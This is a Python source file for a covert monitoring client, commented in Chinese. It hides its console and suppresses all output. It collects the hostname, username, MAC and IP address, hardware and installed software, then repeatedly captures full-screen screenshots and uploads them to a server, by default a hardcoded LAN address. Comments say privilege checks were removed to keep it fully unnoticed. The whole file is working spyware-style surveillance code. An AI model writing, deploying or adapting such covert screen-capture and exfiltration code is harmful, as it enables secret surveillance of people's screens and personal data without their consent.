#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import socket
import platform
import argparse
import threading
import requests
import psutil
import hashlib
from datetime import datetime
from io import BytesIO
import subprocess
import tempfile

# 告警阈值与冷却期（秒）：连续联系服务端失败 N 次后弹窗；弹窗后冷却期内不重复打扰
ALERT_THRESHOLD = 5
ALERT_COOLDOWN = 300

# 默认服务器地址：--server 未指定或指定地址注册失败时回退到此地址
DEFAULT_SERVER_URL = "http://192.168.1.103:8000"

# Windows特定的导入
if platform.system() == 'Windows':
    try:
        import win32gui
        import win32ui
        import win32con
        import win32api
        from PIL import Image
        HAS_WINDOWS_DEPS = True
    except ImportError:
        HAS_WINDOWS_DEPS = False
else:
    HAS_WINDOWS_DEPS = False

class SilentCollector:
    def __init__(self, server_url, client_id=None, interval=10):
        """
        初始化静默收集器
        
        Args:
            server_url: 服务器URL (如: http://192.168.1.100:8000)
            client_id: 客户端ID (如果为None则自动生成)
            interval: 截图收集间隔时间（秒），默认设短一点以体现核心截图功能
        """
        self.server_url = server_url.rstrip('/')
        self.interval = interval
        self.running = False
        
        # 频率控制标志：确保软硬件信息每次运行/连接只发送一次
        self.has_sent_static_info = False

        # 断联告警状态：连续失败计数、上次弹窗时间戳、日志锁、日志路径
        self._fail_count = 0
        self._last_alert_ts = 0.0
        self._log_lock = threading.Lock()
        self._log_path = os.path.join(tempfile.gettempdir(), 'client_agent.log')
        
        # 获取系统基础信息
        self.hostname = socket.gethostname()
        try:
            self.username = os.getlogin()
        except:
            self.username = os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'
            
        self.os_info = platform.platform()
        self.mac_address = self._get_mac_address()
        
        # 客户端ID
        self.client_id = client_id or self._generate_client_id()
        
        # 会话保持
        self.session = requests.Session()
        self.session.timeout = 15
        
        # 隐藏窗口 (Windows下静默运行核心)
        if platform.system() == 'Windows':
            self._hide_console()
        
        # 彻底重定向输出，不发出任何控制台声响或写入
        self._redirect_output()
    
    def _hide_console(self):
        """静默运行：隐藏控制台窗口"""
        try:
            import ctypes
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass
    
    def _redirect_output(self):
        """重定向输出到空设备，确保静默"""
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')

    def _log(self, message):
        """线程安全地追加一行日志（带时间戳）。写日志失败静默吞掉，绝不影响主流程"""
        try:
            line = f"[{datetime.now().isoformat()}] {message}\n"
            with self._log_lock:
                with open(self._log_path, 'a', encoding='utf-8') as f:
                    f.write(line)
        except Exception:
            pass

    def _show_alert(self):
        """在后台线程中弹窗警告。非 Windows 平台降级为仅写日志"""
        self._log("触发断联警告弹窗")
        if platform.system() != 'Windows':
            return
        try:
            import ctypes
            # MessageBoxW 阻塞调用，故本方法只在独立 daemon 线程中执行
            ctypes.windll.user32.MessageBoxW(
                0,
                "客户端无法连接服务端，数据上报已中断，请联系管理员处理。",
                "客户端运行异常",
                0x10 | 0x0  # MB_ICONERROR | MB_OK
            )
        except Exception:
            pass

    def _on_comm_failure(self):
        """统一入口：本轮联系服务端失败。计数+1，达阈值且过冷却期则后台弹窗"""
        self._fail_count += 1
        self._log(f"无法联系服务端，连续失败 {self._fail_count} 次")
        if self._fail_count >= ALERT_THRESHOLD:
            now = time.time()
            if now - self._last_alert_ts >= ALERT_COOLDOWN:
                self._last_alert_ts = now
                threading.Thread(target=self._show_alert, daemon=True).start()

    def _on_comm_success(self):
        """恢复连接时重置计数与冷却状态"""
        if self._fail_count > 0:
            self._log("已恢复与服务端的连接")
        self._fail_count = 0
        self._last_alert_ts = 0.0
    
    def _generate_client_id(self):
        """生成客户端唯一ID"""
        unique_str = f"{self.hostname}_{self.mac_address}_{self.username}"
        return hashlib.md5(unique_str.encode()).hexdigest()[:12]
    
    def _get_mac_address(self):
        """获取MAC地址"""
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output("getmac", shell=True).decode()
                for line in output.split('\n'):
                    if ':' in line and '-' in line:
                        return line.split()[0]
            else:
                import uuid
                return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                                for elements in range(0, 8*6, 8)][::-1])
        except:
            pass
        return "unknown"
    
    def _get_ip_address(self):
        """获取IP地址"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(2)
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except:
            return "127.0.0.1"
    
    def register_client(self):
        """向服务器注册客户端"""
        client_info = {
            'client_id': self.client_id,
            'hostname': self.hostname,
            'username': self.username,
            'os': self.os_info,
            'mac_address': self.mac_address,
            'ip_address': self._get_ip_address(),
            'platform': platform.system(),
            'processor': platform.processor(),
            'version': '2.0.0'
        }
        
        try:
            response = self.session.post(
                f"{self.server_url}/api/receive/register",
                json=client_info,
                timeout=10
            )
            return response.status_code == 200 and response.json().get('status') == 'success'
        except:
            return False
    
    def send_heartbeat(self):
        """发送心跳包"""
        try:
            response = self.session.post(
                f"{self.server_url}/api/receive/heartbeat",
                json={'client_id': self.client_id},
                timeout=5
            )
            return response.status_code == 200
        except:
            return False
    
    def collect_hardware_info(self):
        """收集硬件信息"""
        hardware_info = {
            'client_id': self.client_id,
            'timestamp': datetime.now().isoformat(),
            'system': {
                'hostname': self.hostname,
                'platform': platform.platform(),
                'processor': platform.processor(),
                'machine': platform.machine(),
                'architecture': platform.architecture()[0]
            },
            'cpu': {
                'physical_cores': psutil.cpu_count(logical=False),
                'logical_cores': psutil.cpu_count(logical=True),
            },
            'memory': {
                'total': psutil.virtual_memory().total,
            },
            'disks': []
        }
        
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                hardware_info['disks'].append({
                    'device': partition.device,
                    'mountpoint': partition.mountpoint,
                    'total': usage.total,
                })
            except:
                pass
        return hardware_info
    
    def collect_software_info(self):
        """收集软件信息"""
        software_info = {
            'client_id': self.client_id,
            'timestamp': datetime.now().isoformat(),
            'software_list': []
        }
        
        # 简单获取部分安装程序（防止列表过长导致上报失败）
        if platform.system() == 'Windows':
            import winreg
            software_list = []
            registry_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
            ]
            for hive, path in registry_paths:
                try:
                    with winreg.OpenKey(hive, path) as key:
                        for i in range(0, min(100, winreg.QueryInfoKey(key)[0])):
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                with winreg.OpenKey(key, subkey_name) as subkey:
                                    name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                                    if name and not any(s['name'] == name for s in software_list):
                                        software_list.append({'name': name})
                            except:
                                continue
                except:
                    continue
            software_info['software_list'] = software_list
        return software_info
    
    def capture_screenshot(self):
        """静默截取屏幕截图"""
        if not HAS_WINDOWS_DEPS or platform.system() != 'Windows':
            return None
        
        try:
            # 获取桌面窗口句柄
            hdesktop = win32gui.GetDesktopWindow()
            width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
            height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
            left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
            top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
            
            # 创建设备上下文
            desktop_dc = win32gui.GetWindowDC(hdesktop)
            img_dc = win32ui.CreateDCFromHandle(desktop_dc)
            mem_dc = img_dc.CreateCompatibleDC()
            
            # 创建位图对象
            screenshot = win32ui.CreateBitmap()
            screenshot.CreateCompatibleBitmap(img_dc, width, height)
            mem_dc.SelectObject(screenshot)
            
            # 复制屏幕内容到内存DC
            mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
            
            bmpinfo = screenshot.GetInfo()
            bmpstr = screenshot.GetBitmapBits(True)
            
            # 转换为PIL图像，并进行PNG压缩
            img = Image.frombuffer(
                'RGB',
                (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
                bmpstr, 'raw', 'BGRX', 0, 1
            )
            
            img_bytes = BytesIO()
            # 开启优化和压缩，减少网络传输消耗
            img.save(img_bytes, format='PNG', optimize=True, quality=60)
            screenshot_data = img_bytes.getvalue()
            
            # 释放DC资源（防止内存和句柄泄漏）
            mem_dc.DeleteDC()
            win32gui.DeleteObject(screenshot.GetHandle())
            img_dc.DeleteDC()
            win32gui.ReleaseDC(hdesktop, desktop_dc)
            
            return screenshot_data
        except Exception:
            return None
    
    def send_screenshot(self):
        """核心功能：静默发送屏幕截图到服务端"""
        try:
            screenshot_data = self.capture_screenshot()
            if not screenshot_data:
                return False
            
            metadata = {
                'client_id': self.client_id,
                'timestamp': datetime.now().isoformat(),
                'hostname': self.hostname,
                'username': self.username
            }
            
            files = {
                'file': ('screenshot.png', screenshot_data, 'image/png'),
                'metadata': (None, json.dumps(metadata), 'application/json')
            }
            
            response = self.session.post(
                f"{self.server_url}/api/receive/screenshot",
                files=files,
                timeout=20
            )
            return response.status_code == 200
        except:
            return False

    def collect_and_send(self):
        """控制执行：静态信息仅上报一次，核心截图每次循环都上报"""
        # 统计本轮各通信结果：任一成功视为可联系服务端（清零计数），全部失败才计入断联
        results = []

        # 1. 始终维持心跳
        results.append(self.send_heartbeat())

        # 2. 如果是连接后的首次运行，静默上报一次软硬件静态信息
        if not self.has_sent_static_info:
            hw_ok = self.send_hardware_info()
            sw_ok = self.send_software_info()
            if hw_ok and sw_ok:
                self.has_sent_static_info = True # 标记为已发送，后续不再重复获取
            results.extend([hw_ok, sw_ok])

        # 3. 核心功能：每次循环都抓取并静默回传截图
        results.append(self.send_screenshot())

        # 4. 按本轮通信成败更新断联告警状态
        if any(results):
            self._on_comm_success()
        else:
            self._on_comm_failure()

    def send_hardware_info(self):
        try:
            info = self.collect_hardware_info()
            res = self.session.post(f"{self.server_url}/api/receive/hardware", json=info, timeout=10)
            return res.status_code == 200
        except:
            return False

    def send_software_info(self):
        try:
            info = self.collect_software_info()
            res = self.session.post(f"{self.server_url}/api/receive/software", json=info, timeout=10)
            return res.status_code == 200
        except:
            return False

    def run_daemon(self):
        """以守护进程（后台静默服务）方式运行"""
        self.running = True
        
        # 初始注册阶段
        registered = False
        while self.running and not registered:
            if self.register_client():
                registered = True
            else:
                self._log(f"注册失败（当前地址: {self.server_url}），5 秒后重试")
                # 指定地址注册失败时回退到默认地址；若已在默认地址则继续重试，不回切避免抖动
                if self.server_url != DEFAULT_SERVER_URL:
                    self._log(f"回退到默认服务器地址: {DEFAULT_SERVER_URL}")
                    self.server_url = DEFAULT_SERVER_URL
                time.sleep(5) # 注册失败时每5秒静默重试
        
        while self.running:
            try:
                start_time = time.time()
                self.collect_and_send()
                
                elapsed = time.time() - start_time
                sleep_time = max(1, self.interval - elapsed)
                time.sleep(sleep_time)
            except Exception:
                time.sleep(10) # 异常时静默等待10秒再试

    def stop(self):
        self.running = False

def main():
    parser = argparse.ArgumentParser(description='系统静默采集客户端')
    parser.add_argument('--server', default=DEFAULT_SERVER_URL,
                        help=f'服务器地址 (如: http://192.168.1.100:8000)，不指定时使用默认 {DEFAULT_SERVER_URL}，指定地址无法注册时回退到默认地址')
    parser.add_argument('--interval', type=int, default=60, help='截图收集与回传间隔时间（秒）')
    args = parser.parse_args()

    collector = SilentCollector(
        server_url=args.server,
        interval=args.interval
    )
    collector.run_daemon()

if __name__ == '__main__':
    # 注意：为了确保彻底的无感静默，移除了任何 IsUserAnAdmin 的提权校验
    main()